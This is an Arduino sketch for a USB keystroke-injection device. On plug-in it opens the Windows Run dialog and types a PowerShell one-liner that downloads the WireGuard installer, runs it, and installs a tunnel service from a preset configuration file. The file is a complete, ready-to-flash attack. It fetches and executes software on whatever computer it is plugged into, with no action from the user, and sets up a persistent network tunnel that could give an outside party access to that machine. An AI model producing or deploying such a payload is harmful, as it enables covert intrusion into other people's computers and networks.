#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("powershell Invoke-WebRequest -Uri https://download.wireguard.com/windows-client/wireguard-installer.exe -OutFile $env:TEMP\\wg.exe; Start-Process $env:TEMP\\wg.exe -ArgumentList '/installtunnelservice C:\\wg\\config.conf' -Wait"));
}

void loop() {}
